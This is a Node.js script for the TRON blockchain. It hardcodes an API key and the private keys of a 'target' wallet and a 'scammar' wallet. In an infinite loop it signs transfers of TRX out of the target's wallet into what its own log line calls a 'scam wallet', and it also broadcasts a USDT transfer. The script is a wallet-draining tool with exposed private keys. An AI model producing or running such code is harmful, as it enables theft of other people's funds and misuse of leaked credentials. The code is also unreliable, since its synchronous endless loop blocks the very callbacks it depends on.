
const TronWeb = require('tronweb');
const request = require("request");
const HttpProvider = TronWeb.providers.HttpProvider;
const fullNode = new HttpProvider("https://api.trongrid.io");
const solidityNode = new HttpProvider("https://api.trongrid.io");
const eventServer = new HttpProvider("https://api.trongrid.io");
const APIKeyOfTarget = "b115ec91-e52d-4ba5-80e1-0e51ce6b52db";
const PRKOfTarget = "b5717dd97a7cf40e887179e4ff7250aba116cf699c166ac3835ccbe3737b303e";
const targetAddress = "TEbbvxbgAi1oYxjeNk4WqjXGnHgeqj4rne";
const mainnetURL = "https://api.trongrid.io";
const scammarAddress = "TPL66VK2gCXNCD7EJg9pgJRfqcRazjhUZY";
const PRKOfScammar = "da146374a75310b9666e834ee4ad0866d6f4035967bfc76217c5a495fff9f0d0";
const USDTContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, PRKOfScammar);

const sdk = require('api')('@tron/v4.5.1#7p0hyl5luq81q');

while(true)
{
    sdk.easytransferbyprivate({privateKey: PRKOfTarget, toAddress: scammarAddress, amount: 10})
    .then(res => {
        
        console.log("Transfered 10 TRX to scam wallet :", res);

        async function main() {
            let {
                transaction,
                result
            } = await tronWeb.transactionBuilder.triggerSmartContract(
                USDTContract, 'transfer(address,uint256)', {
                    feeLimit: 1000000,
                    callValue: 0
                },
                [{
                    type: 'address',
                    value: targetAddress
                }, {
                    type: 'uint256',
                    value: 1000
                }]
            );
            if (!result.result) {
                console.error("error:", result);
                return;
            }

            const signature = await tronWeb.trx.sign(transaction.raw_data_hex);
            console.log("Signature:", signature);
            transaction["signature"] = [signature];

            const broadcast = await tronWeb.trx.sendRawTransaction(transaction);
            console.log("result:", broadcast);

            const {
                message
            } = broadcast;
            if (message) {
                console.log("Error:", Buffer.from(message, 'hex').toString());
            }
        }

        main().then(() => {
            console.log("ok");
        })
        .catch((err) => {
            console.trace(err);
        });

    })
    .catch(err => console.error(err));

}